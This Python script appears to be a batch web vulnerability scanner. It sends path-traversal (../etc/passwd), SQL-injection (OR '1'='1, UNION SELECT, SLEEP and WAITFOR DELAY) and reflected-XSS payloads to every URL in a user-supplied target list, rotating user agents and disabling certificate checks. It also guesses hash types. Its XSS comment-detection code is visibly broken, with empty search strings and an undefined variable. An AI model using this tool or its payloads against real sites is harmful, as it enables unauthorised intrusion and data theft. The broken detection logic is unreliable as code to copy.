import requests
import time
import os
import random
import re # Added for potential future regex use, maybe simple checks
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

# --- Constants ---
LFI_OUTPUT_FILE = "lfi_vulns.txt"
SQLI_OUTPUT_FILE = "sqli_vulns.txt" # Added
XSS_OUTPUT_FILE = "xss_vulns.txt"   # Added

LFI_PAYLOAD_FILE = "payloads/lfi_payloads.txt"
SQLI_PAYLOAD_FILE = "payloads/sql_payloads.txt"
XSS_PAYLOAD_FILE = "payloads/xss_payloads.txt"
HASH_SAMPLE_FILE = "payloads/hash_samples.txt"
USER_AGENTS_FILE = "payloads/user_agents.txt"
DEFAULT_USER_AGENT = "FastBatchScannerUA/1.4" # Incremented version

# Time-based SQLi detection settings
TIME_BASED_SLEEP_DURATION = 5 # seconds (Payloads should use this value)
TIME_BASED_THRESHOLD = TIME_BASED_SLEEP_DURATION * 0.8 # If response takes >= 80% of sleep time
REQUEST_TIMEOUT = TIME_BASED_SLEEP_DURATION + 7 # Request timeout must be > sleep duration + normal response time (e.g., 5 + 7 = 12s)


# --- Global Variables ---
LOADED_USER_AGENTS = []

# --- Core Functions ---

def make_request(url, headers=None):
    """Makes a GET request with rotated UA, returns response object, text chunk, and duration."""
    global LOADED_USER_AGENTS
    global DEFAULT_USER_AGENT

    if LOADED_USER_AGENTS:
        selected_ua = random.choice(LOADED_USER_AGENTS)
    else:
        selected_ua = DEFAULT_USER_AGENT

    final_headers = {"User-Agent": selected_ua}
    if headers:
        final_headers.update(headers)
        final_headers["User-Agent"] = selected_ua

    start_time = time.time()
    try:
        response = requests.get(url, headers=final_headers, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=False, stream=True)
        content_chunk = response.raw.read(1024 * 5, decode_content=True)
        response.close()
        duration = time.time() - start_time
        return response, content_chunk.decode('utf-8', errors='ignore'), duration
    except requests.exceptions.Timeout:
        duration = time.time() - start_time
        # If it times out exactly at our request timeout, AND we were testing a time-based payload, it's highly suspicious
        # Check this condition within the test_sql_payloads function
        return None, None, duration # Return duration even on timeout
    except requests.exceptions.RequestException as e:
        duration = time.time() - start_time
        # print(f"[-] Request error for {url}: {e}")
        return None, None, duration
    except Exception as e:
        duration = time.time() - start_time
        # print(f"[-] General error for {url}: {e}")
        return None, None, duration


def save_finding(filename, finding_text):
    """Appends a finding to the specified file."""
    try:
        with open(filename, 'a') as f:
            f.write(f"{finding_text}\n")
    except Exception as e:
        print(f"[-] Error saving finding to {filename}: {e}")

# --- Test Functions ---

def test_lfi_payloads(base_url, log):
    """Tests for LFI vulnerabilities using common params and payloads."""
    # This function remains largely the same, just using the updated make_request (duration not needed here)
    log(f"[*] Starting LFI scan on {base_url}...")
    if not os.path.exists(LFI_PAYLOAD_FILE):
        log(f"[-] LFI payload file not found: {LFI_PAYLOAD_FILE}. Skipping LFI for this target.")
        return

    lfi_indicators = [
        "root:x:0:0:", "\[boot loader\]", "Windows\\System32\\drivers\\etc\\hosts",
        "servlet-mapping", "DB_USERNAME", "<?php", "root:.*?:[0-9]*:[0-9]*:",
        "OdbcConnection",
    ]
    common_lfi_params = ["file", "page", "path", "include", "document", "view", "dir", "cat"]
    found_lfi_target = False

    try:
        with open(LFI_PAYLOAD_FILE) as f:
            payloads = [line.strip() for line in f if line.strip()]

        for lfi_param in common_lfi_params:
            for payload in payloads:
                parsed_url = urlparse(base_url)
                query = parse_qs(parsed_url.query)
                query[lfi_param] = payload
                url_parts = list(parsed_url)
                url_parts[4] = urlencode(query, doseq=True)
                url = urlunparse(url_parts)

                response, response_text, _ = make_request(url) # Ignore duration here

                if response and response_text:
                    for indicator in lfi_indicators:
                        if indicator.lower() in response_text.lower():
                            finding = f"[Target: {base_url}] [!] LFI Possible → URL: {url}"
                            log(finding)
                            save_finding(LFI_OUTPUT_FILE, finding) # Save LFI hit
                            found_lfi_target = True
                            break # Break indicator loop
    except FileNotFoundError:
         log(f"[-] LFI payload file missing: {LFI_PAYLOAD_FILE}")
    except Exception as e:
        log(f"[-] LFI test error for {base_url}: {e}")


def test_sql_payloads(base_url, param_name, log):
    """Tests for SQL injection (Error-based and Time-based)."""
    # log(f"[*] Testing SQLi on {base_url} (param: {param_name})...") # Reduce noise
    if not os.path.exists(SQLI_PAYLOAD_FILE):
        return

    sql_error_indicators = ["sql", "syntax", "warning", "mysql", "error", "unclosed quotation mark", "odbc", "invalid input", "ora-"]
    time_based_triggers = ["SLEEP(", "WAITFOR DELAY"] # Case-insensitive check later

    try:
        with open(SQLI_PAYLOAD_FILE) as f:
             payloads = [line.strip() for line in f if line.strip()]

        for payload in payloads:
            is_time_based = any(trigger.lower() in payload.lower() for trigger in time_based_triggers)

            parsed_url = urlparse(base_url)
            query = parse_qs(parsed_url.query)
            query[param_name] = payload
            url_parts = list(parsed_url)
            url_parts[4] = urlencode(query, doseq=True)
            url = urlunparse(url_parts)

            response, response_text, duration = make_request(url)

            # 1. Check for Error-Based SQLi
            if response and response_text and any(err.lower() in response_text.lower() for err in sql_error_indicators):
                finding = f"[Target: {base_url}] [!] SQLi Possible (Error Based) → Param: {param_name}, Payload: {payload}"
                log(finding)
                save_finding(SQLI_OUTPUT_FILE, finding) # Save SQLi hit
                # Don't check time-based if error-based already found for this payload
                continue # Move to next payload

            # 2. Check for Time-Based SQLi (only if payload looks time-based)
            if is_time_based:
                # Check if duration exceeds threshold OR if it timed out exactly at request timeout
                timed_out_suspiciously = (response is None and duration >= REQUEST_TIMEOUT * 0.95) # Hit the timeout wall
                if duration >= TIME_BASED_THRESHOLD or timed_out_suspiciously:
                    finding = f"[Target: {base_url}] [!] SQLi Possible (Time Based: {duration:.2f}s) → Param: {param_name}, Payload: {payload}"
                    log(finding)
                    save_finding(SQLI_OUTPUT_FILE, finding) # Save SQLi hit
                    # Found time-based, move to next payload
                    continue

    except FileNotFoundError:
         pass
    except Exception as e:
        log(f"[-] SQLi test error for {base_url} / {param_name}: {e}")


def test_xss_payloads(base_url, param_name, log):
    """Tests for reflected XSS vulnerabilities."""
    # log(f"[*] Testing XSS on {base_url} (param: {param_name})...") # Reduce noise
    if not os.path.exists(XSS_PAYLOAD_FILE):
        return

    try:
        with open(XSS_PAYLOAD_FILE) as f:
             payloads = [line.strip() for line in f if line.strip()]
        for payload in payloads:
            parsed_url = urlparse(base_url)
            query = parse_qs(parsed_url.query)
            query[param_name] = payload
            url_parts = list(parsed_url)
            url_parts[4] = urlencode(query, doseq=True)
            url = urlunparse(url_parts)

            response, response_text, _ = make_request(url) # Ignore duration

            # Improved Check: Payload reflected AND contains critical XSS chars
            if response and response_text and payload in response_text:
                # Check if payload contains characters typically needed for XSS execution
                # and ensure it wasn't *completely* neutralized (e.g. fully HTML encoded)
                # This is still basic but better than just checking reflection.
                if any(c in payload for c in '<>"\'()")') and not all(c in '&lt;&gt;&amp;&quot;&#39;' for c in payload):
                     # Additional simple check: ensure it's not inside an obvious HTML comment
                     # This is imperfect as comments can be complex (nested, etc.)
                     # Find first occurrence of payload
                     try:
                         index = response_text.find(payload)
                         # Look for comment start/end around the payload reflection
                         comment_start = response_text.rfind('', index + len(payload))

                         # If start found AND (no end found OR end is after payload) -> likely inside comment
                         is_in_comment = (comment_start != -1 and (comment_end == -1 or comment_end >= index + len(payload)))

                         # Only log if NOT likely inside a simple comment
                         if not is_in_comment:
                             finding = f"[Target: {base_url}] [!] XSS Possible (Reflected) → Param: {param_name}, Payload: {payload}"
                             log(finding)
                             save_finding(XSS_OUTPUT_FILE, finding) # Save XSS hit
                             # Found XSS, move to next payload for this param? Or continue checking other payloads? Let's break for speed.
                             break
                     except Exception: # Handle potential errors in comment checking logic gracefully
                          # Fallback to original logic if comment check fails
                           finding = f"[Target: {base_url}] [!] XSS Possible (Reflected - Comment Check Failed) → Param: {param_name}, Payload: {payload}"
                           log(finding)
                           save_finding(XSS_OUTPUT_FILE, finding)
                           break

    except FileNotFoundError:
         pass
    except Exception as e:
        log(f"[-] XSS test error for {base_url} / {param_name}: {e}")


def detect_hash_type_and_guess(log):
    """Analyzes hashes from a file and guesses the type."""
    # No changes needed here
    log("[*] Analyzing hashes...")
    if not os.path.exists(HASH_SAMPLE_FILE):
        log(f"[-] Hash sample file not found: {HASH_SAMPLE_FILE}. Skipping hash analysis.")
        return
    try:
        with open(HASH_SAMPLE_FILE) as f:
            hashes = [line.strip() for line in f if line.strip()]
        if not hashes:
            log("[-] Hash sample file is empty.")
            return
        for h in hashes:
            log_msg = f"[?] {h[:30]}... → Unknown hash type"
            h_lower = h.lower()
            if len(h) == 32 and all(c in '0123456789abcdef' for c in h_lower): log_msg = f"[+] {h} → Possible MD5"
            elif len(h) == 40 and all(c in '0123456789abcdef' for c in h_lower): log_msg = f"[+] {h} → Possible SHA1"
            elif len(h) == 64 and all(c in '0123456789abcdef' for c in h_lower): log_msg = f"[+] {h} → Possible SHA256"
            elif len(h) == 56 and all(c in '0123456789abcdef' for c in h_lower): log_msg = f"[+] {h} → Possible SHA224"
            elif len(h) == 96 and all(c in '0123456789abcdef' for c in h_lower): log_msg = f"[+] {h} → Possible SHA384"
            elif len(h) == 128 and all(c in '0123456789abcdef' for c in h_lower): log_msg = f"[+] {h} → Possible SHA512"
            elif h.startswith(("$2a$", "$2b$", "$2y$")): log_msg = f"[+] {h[:30]}... → Possible bcrypt"
            elif h.startswith("$1$"): log_msg = f"[+] {h[:30]}... → Possible MD5-Crypt"
            elif h.startswith("$5$"): log_msg = f"[+] {h[:30]}... → Possible SHA256-Crypt"
            elif h.startswith("$6$"): log_msg = f"[+] {h[:30]}... → Possible SHA512-Crypt"
            elif "$argon2id$" in h or "$argon2i$" in h or "$argon2d$" in h: log_msg = f"[+] {h[:30]}... → Possible Argon2"
            elif h.startswith("{SSHA}"): log_msg = f"[+] {h[:30]}... → Possible SSHA (LDAP)"
            log(log_msg)
    except FileNotFoundError: log(f"[-] Hash sample file missing: {HASH_SAMPLE_FILE}")
    except Exception as e: log(f"[-] Hash analysis error: {e}")
    log("[*] Hash analysis finished.")

# --- Utility ---

def load_user_agents(filepath, default_ua, log):
    """Loads user agents from file, returns list or default."""
    # No changes needed here
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                uas = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            if uas:
                log(f"[*] Loaded {len(uas)} user agents from {filepath}")
                return uas
            else:
                log(f"[-] User agent file '{filepath}' is empty. Using default.")
                return [default_ua]
        else:
            log(f"[-] User agent file '{filepath}' not found. Using default.")
            return [default_ua]
    except Exception as e:
        log(f"[-] Error loading user agents from {filepath}: {e}. Using default.")
        return [default_ua]

def prepare_payload_files(log):
    """Checks for payload dir/files and creates dummies if missing."""
    payload_dir = 'payloads'
    if not os.path.exists(payload_dir):
        try:
            os.makedirs(payload_dir)
            log(f"[*] Created directory: {payload_dir}")
        except OSError as e:
            log(f"[-] Failed to create directory {payload_dir}: {e}. Exiting.")
            return False

    # Added example time-based payload
    files_to_check = {
        LFI_PAYLOAD_FILE: "../../../../etc/passwd\n../../../../boot.ini\n",
        SQLI_PAYLOAD_FILE: ("' OR '1'='1\n"
                            "' UNION SELECT null, version() -- \n"
                            f"' AND SLEEP({TIME_BASED_SLEEP_DURATION}) -- \n" # Example Time-Based
                            f"1; WAITFOR DELAY '0:0:{TIME_BASED_SLEEP_DURATION}' -- \n"), # Example Time-Based (SQL Server)
        XSS_PAYLOAD_FILE: ("<script>alert('XSS')</script>\n"
                           "<img src=x onerror=alert(1)>\n"
                           "'\"><svg/onload=alert(2)>\n"),
        HASH_SAMPLE_FILE: "5f4dcc3b5aa765d61d8327deb882cf99\n$2y$10$ExampleHashExampleHashExampleHashExampleHashExampleHashEx\n",
        USER_AGENTS_FILE: ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\n"
                           f"{DEFAULT_USER_AGENT}\n")
    }

    all_files_ok = True
    for fpath, dummy_content in files_to_check.items():
        if not os.path.exists(fpath):
            try:
                with open(fpath, 'w') as f:
                    f.write(dummy_content)
                log(f"[*] Created dummy payload file: {fpath}")
            except IOError as e:
                log(f"[-] Failed to create dummy file {fpath}: {e}")
                all_files_ok = False

    # Check output files can be written (create empty ones)
    output_files = [LFI_OUTPUT_FILE, SQLI_OUTPUT_FILE, XSS_OUTPUT_FILE]
    for fpath in output_files:
        try:
            # Open in append mode to create if not exists, without clearing if it does
            with open(fpath, 'a'):
                pass
        except IOError as e:
             log(f"[-] Cannot write to output file {fpath}: {e}")
             all_files_ok = False # Cannot save findings

    if not os.path.exists(SQLI_PAYLOAD_FILE): log(f"[-] Warning: SQLi payload file missing: {SQLI_PAYLOAD_FILE}")
    if not os.path.exists(XSS_PAYLOAD_FILE): log(f"[-] Warning: XSS payload file missing: {XSS_PAYLOAD_FILE}")
    if not os.path.exists(LFI_PAYLOAD_FILE): log(f"[-] Warning: LFI payload file missing: {LFI_PAYLOAD_FILE}")

    return all_files_ok

# --- Main Execution ---

def run_tests():
    """Gets target list file and runs scans, saving LFI, SQLi, XSS hits."""
    def log(msg): print(msg)
    global LOADED_USER_AGENTS

    log("--- Fast Batch Vulnerability Scanner w/ UA Rotation ---")
    log(f"Using payload files from '{os.path.dirname(LFI_PAYLOAD_FILE)}/' directory.")
    log(f"Findings saved to: {LFI_OUTPUT_FILE}, {SQLI_OUTPUT_FILE}, {XSS_OUTPUT_FILE}") # Updated log
    log("-" * 30)

    if not prepare_payload_files(log):
        log("[-] Errors preparing payload/output files. Cannot continue reliably. Exiting.")
        return

    LOADED_USER_AGENTS = load_user_agents(USER_AGENTS_FILE, DEFAULT_USER_AGENT, log)
    log("-" * 30)

    target_list_file = input("Enter filename containing list of target URLs (one per line): ").strip()
    if not target_list_file:
        log("[-] No target file provided. Exiting.")
        return

    try:
        with open(target_list_file, 'r') as f:
            target_urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        if not target_urls:
            log(f"[-] Target file '{target_list_file}' is empty or contains no valid URLs. Exiting.")
            return
        log(f"[*] Loaded {len(target_urls)} target(s) from {target_list_file}")
    except FileNotFoundError:
        log(f"[-] Target file not found: {target_list_file}. Exiting.")
        return
    except Exception as e:
        log(f"[-] Error reading target file {target_list_file}: {e}. Exiting.")
        return

    sqli_params_str = input("Parameter name(s) for SQLi (comma-separated, e.g., id,user): ").strip()
    xss_params_str = input("Parameter name(s) for XSS (comma-separated, e.g., query,search): ").strip()
    log("-" * 30)

    start_time = time.time()
    total_targets = len(target_urls)

    for i, base_url in enumerate(target_urls):
        log(f"[*] Scanning Target {i+1}/{total_targets}: {base_url}")

        test_lfi_payloads(base_url, log)

        if sqli_params_str:
            for param in sqli_params_str.split(','):
                param = param.strip()
                if param: test_sql_payloads(base_url, param, log)
        else: log(f"  [-] Skipping SQLi for {base_url} (no params specified).")

        if xss_params_str:
            for param in xss_params_str.split(','):
                 param = param.strip()
                 if param: test_xss_payloads(base_url, param, log)
        else: log(f"  [-] Skipping XSS for {base_url} (no params specified).")

        log(f"[*] Finished scanning {base_url}")
        log("-" * 10)


    detect_hash_type_and_guess(log)

    end_time = time.time()
    log("-" * 30)
    log(f"[*] All scans finished in {end_time - start_time:.2f} seconds.")

    # Check and report output files
    output_files_found = {
        "LFI": LFI_OUTPUT_FILE,
        "SQLi": SQLI_OUTPUT_FILE,
        "XSS": XSS_OUTPUT_FILE
    }
    for vuln_type, fpath in output_files_found.items():
        if os.path.exists(fpath) and os.path.getsize(fpath) > 0:
            log(f"[!] Check '{fpath}' for potential {vuln_type} findings.")
        else:
            log(f"[*] No {vuln_type} findings were saved to {fpath}.")


if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    run_tests()
